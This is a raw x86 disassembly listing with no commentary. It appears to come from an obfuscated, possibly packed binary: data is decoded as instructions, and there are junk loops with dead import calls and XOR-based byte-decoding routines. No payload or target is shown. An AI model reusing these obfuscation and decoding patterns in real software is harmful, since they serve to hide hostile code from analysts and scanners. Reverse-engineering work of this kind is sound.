  4119d4:	icebp  
  4119d5:	mov    WORD PTR [esp+edx*4-0x46429cd7],?
  4119dc:	push   ecx
  4119dd:	xchg   edx,eax
  4119de:	stos   DWORD PTR es:[edi],eax
  4119df:	xor    ecx,edi
  4119e1:	and    DWORD PTR [edi-0x3b],0x8235bb25
  4119e8:	icebp  
  4119e9:	fwait
  4119ea:	scas   eax,DWORD PTR es:[edi]
  4119eb:	or     BYTE PTR [ecx],ah
  4119ed:	das    
  4119ee:	into   
  4119ef:	icebp  
  4119f0:	dec    ebx
  4119f1:	ins    DWORD PTR es:[edi],dx
  4119f2:	or     edx,DWORD PTR [ebx]
  4119f4:	mov    edi,0xf4f1bbde
  4119f9:	xchg   BYTE PTR [esi-0x5ffab909],bh
  4119ff:	xor    ecx,DWORD PTR [ebx-0x3b00a82a]
  411a05:	js     0x4119e0
  411a07:	arpl   WORD PTR es:[ebx-0xe46e084],cx
  411a0e:	clc    
  411a0f:	add    al,0xd0
  411a11:	mov    al,ds:0x80a3d9b
  411a16:	add    eax,eax
  411a18:	jns    0x411a3e
  411a1a:	inc    ebp
  411a1b:	push   es
  411a1c:	call   0xc0120572
  411a21:	call   0x212f:0xd46691ab
  411a28:	ss pop ebp
  411a2a:	mov    ds:0x63723e9e,al
  411a2f:	xchg   esp,eax
  411a30:	ja     0x4119e3
  411a32:	mov    ah,0xd3
  411a34:	loopne 0x4119fb
  411a36:	jo     0x411a12
  411a38:	(bad)  
  411a39:	js     0x411a5c
  411a3b:	mov    eax,0x362dd88c
  411a40:	sbb    DWORD PTR [edi+0x62],edx
  411a43:	pop    esp
  411a44:	sbb    BYTE PTR [edx-0x4e],bl
  411a47:	test   BYTE PTR [ebx],ah
  411a49:	cmp    al,0x4c
  411a4b:	inc    edi
  411a4c:	std    
  411a4d:	and    edx,DWORD PTR [eax]
  411a4f:	push   ebx
  411a50:	(bad)  ds:0xe7c87292
  411a56:	cmp    edi,DWORD PTR [si]
  411a59:	ret    0x74c8
  411a5c:	sbb    bh,al
  411a5e:	mov    ds:0x3e7fb188,al
  411a63:	add    ebp,DWORD PTR [esi-0x5ac0d820]
  411a69:	scas   eax,DWORD PTR es:[edi]
  411a6a:	mov    BYTE PTR [ebx-0x44],ah
  411a6d:	je     0x411acb
  411a6f:	adc    eax,0x4c43bbaa
  411a74:	mov    DWORD PTR [ebp+0x47a04125],ebp
  411a7a:	xor    BYTE PTR [eax+0x1e],ah
  411a7d:	sti    
  411a7e:	mov    al,0x15
  411a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a81:	xor    BYTE PTR [ebp+0x57],ch
  411a84:	fld    QWORD PTR ds:0x33c5198a
  411a8a:	adc    edi,DWORD PTR [ebp*1+0x3475fda3]
  411a91:	int3   
  411a92:	add    DWORD PTR [eax-0x2d],ebx
  411a95:	mov    dl,0xeb
  411a97:	ret    
  411a98:	mov    ebx,0xde33497b
  411a9d:	adc    al,bh
  411a9f:	int3   
  411aa0:	xor    esp,DWORD PTR [ebx-0xa]
  411aa3:	or     al,0x4f
  411aa5:	ss or  esp,0x656850cb
  411aac:	jns    0x411a5d
  411aae:	mov    esi,0xe73c4260
  411ab3:	and    al,0xe9
  411ab5:	and    BYTE PTR [eax],0x4a
  411ab8:	stos   DWORD PTR es:[edi],eax
  411ab9:	and    BYTE PTR [edi-0x330b58d2],cl
  411abf:	jp     0x411af0
  411ac1:	test   al,0xa0
  411ac3:	bound  ecx,QWORD PTR [edi+0x75]
  411ac6:	cmc    
  411ac7:	sub    dl,cl
  411ac9:	lods   al,BYTE PTR ds:[esi]
  411aca:	xor    al,0xcd
  411acc:	jbe    0x411b47
  411ace:	fadd   DWORD PTR [ecx-0x8]
  411ad1:	push   es
  411ad2:	inc    eax
  411ad3:	pop    es
  411ad4:	push   esp
  411ad5:	stos   DWORD PTR es:[edi],eax
  411ad6:	pop    ebx
  411ad7:	ret    
  411ad8:	mov    BYTE PTR [esi+0x69],dh
  411adb:	scas   al,BYTE PTR es:[edi]
  411adc:	popf   
  411add:	and    ecx,DWORD PTR [eax+0x706da98c]
  411ae3:	mov    ebp,0x832b4f7c
  411ae8:	and    BYTE PTR [edx+eax*1-0x7146c892],ch
  411aef:	ret    
  411af0:	mov    eax,0x1a78ec0c
  411af5:	cli    
  411af6:	stc    
  411af7:	dec    edx
  411af8:	pop    ebp
  411af9:	repnz add DWORD PTR [eax+ebx*8],edx
  411afd:	loopne 0x411aea
  411aff:	call   0x99b:0x9d1b5897
  411b06:	mov    WORD PTR [ebx],?
  411b08:	and    edi,esi
  411b0a:	adc    eax,0xd915cda5
  411b0f:	ficomp WORD PTR [esi]
  411b11:	cmp    eax,0x37228ca4
  411b16:	mov    esp,0xca0220ca
  411b1b:	push   esp
  411b1c:	(bad)  [edx]
  411b1e:	jae    0x411b10
  411b20:	cs push ecx
  411b22:	fwait
  411b23:	jg     0x411b92
  411b25:	lods   eax,DWORD PTR ds:[esi]
  411b26:	pop    eax
  411b27:	scas   eax,DWORD PTR es:[edi]
  411b28:	std    
  411b29:	lods   eax,DWORD PTR ds:[esi]
  411b2a:	pop    ebp
  411b2b:	cld    
  411b2c:	test   ebx,ecx
  411b2e:	xchg   ecx,eax
  411b2f:	cs std 
  411b31:	sub    dh,BYTE PTR [edx]
  411b33:	loopne 0x411b22
  411b35:	data16 test al,0xac
  411b38:	enter  0xf4ab,0x3b
  411b3c:	cmp    al,0xa0
  411b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3f:	mov    bl,0x4d
  411b41:	inc    esp
  411b42:	mov    al,BYTE PTR [ecx]
  411b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b45:	sbb    BYTE PTR [edi+0x75],ah
  411b48:	and    al,0x56
  411b4a:	leave  
  411b4b:	fbld   TBYTE PTR [ebx+0x7a349c47]
  411b51:	lahf   
  411b52:	pop    ecx
  411b53:	in     eax,0x73
  411b55:	inc    edx
  411b56:	xchg   edx,eax
  411b57:	xchg   BYTE PTR [ebp+0x77],ah
  411b5a:	cs mov ah,0x2e
  411b5d:	imul   DWORD PTR [ebp-0x119c3953]
  411b63:	xor    eax,0x51d53700
  411b68:	and    ecx,DWORD PTR [eax-0x4b]
  411b6b:	dec    eax
  411b6c:	ja     0x411ba0
  411b6e:	push   0x4a
  411b70:	sub    DWORD PTR [edx],eax
  411b72:	sub    BYTE PTR [ecx+0xa],al
  411b75:	and    edx,DWORD PTR [ebp+0xa]
  411b78:	add    esi,DWORD PTR [edx]
  411b7a:	call   0x71855531
  411b7f:	sbb    ah,BYTE PTR [edi]
  411b81:	cmp    BYTE PTR [edi-0x41],dh
  411b84:	xchg   esp,eax
  411b85:	sbb    bl,BYTE PTR [esi]
  411b87:	xchg   ebx,eax
  411b88:	outs   dx,DWORD PTR ds:[esi]
  411b89:	lahf   
  411b8a:	stos   BYTE PTR es:[edi],al
  411b8b:	sar    BYTE PTR [edi-0x66db8ded],0x54
  411b92:	and    DWORD PTR [ebx],eax
  411b94:	in     eax,0x0
  411b96:	outs   dx,BYTE PTR ds:[esi]
  411b97:	pop    es
  411b98:	inc    edx
  411b99:	mov    ah,0xae
  411b9b:	jle    0x411b8e
  411b9d:	jmp    0x411c13
  411b9f:	sbb    al,0x5c
  411ba1:	add    edi,esp
  411ba3:	ja     0x411b4b
  411ba5:	push   edi
  411ba6:	scas   al,BYTE PTR es:[edi]
  411ba7:	lahf   
  411ba8:	je     0x411b5e
  411baa:	mov    ebx,0xbe364653
  411baf:	push   esp
  411bb0:	cmp    edi,DWORD PTR [ecx-0x3c]
  411bb3:	lea    ecx,[ecx-0x141e719]
  411bb9:	inc    esp
  411bba:	cmp    bh,0xd
  411bbd:	jns    0xfb208fba
  411bc3:	jg     0x411b4d
  411bc5:	add    dh,BYTE PTR [esi+eax*4-0xc013e9f]
  411bcc:	in     al,dx
  411bcd:	div    BYTE PTR [ebx+0x58]
  411bd0:	mov    ebp,fs
  411bd2:	adc    al,0x10
  411bd4:	lods   eax,DWORD PTR ds:[esi]
  411bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd6:	leave  
  411bd7:	cld    
  411bd8:	out    0x9b,eax
  411bda:	loop   0x411c27
  411bdc:	les    ebp,FWORD PTR [ecx+eax*8-0x5bfa68c9]
  411be3:	stos   DWORD PTR es:[edi],eax
  411be4:	mov    esp,DWORD PTR [eax]
  411be6:	in     al,0x56
  411be8:	add    edx,DWORD PTR [ecx]
  411bea:	sub    BYTE PTR [esi-0x5b],ah
  411bed:	dec    esp
  411bee:	cwde   
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
